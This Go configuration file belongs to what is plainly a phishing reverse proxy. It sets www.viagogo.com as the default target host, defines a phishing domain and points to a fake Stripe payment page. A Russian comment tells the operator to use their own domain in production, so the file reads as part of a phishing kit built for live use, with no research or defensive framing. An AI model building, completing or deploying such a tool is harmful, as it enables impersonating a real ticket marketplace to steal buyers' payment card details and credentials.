
package config

import "os"

type Config struct {
    Port         string
    TargetScheme string
    TargetHost   string
    PhishDomain  string
    StripePage   string
}

func Load() *Config {
    return &Config{
        Port:         getEnv("PORT", "8080"),
        TargetScheme: getEnv("TARGET_SCHEME", "https"),
        TargetHost:   getEnv("TARGET_HOST", "www.viagogo.com"),
        PhishDomain:  getEnv("PHISH_DOMAIN", "localhost:8080"), // на проде свой домен
        StripePage:   getEnv("STRIPE_PAGE", "/static/stripe.html"),
    }
}

func getEnv(key, fallback string) string {
    if v := os.Getenv(key); v != "" {
        return v
    }
    return fallback
}
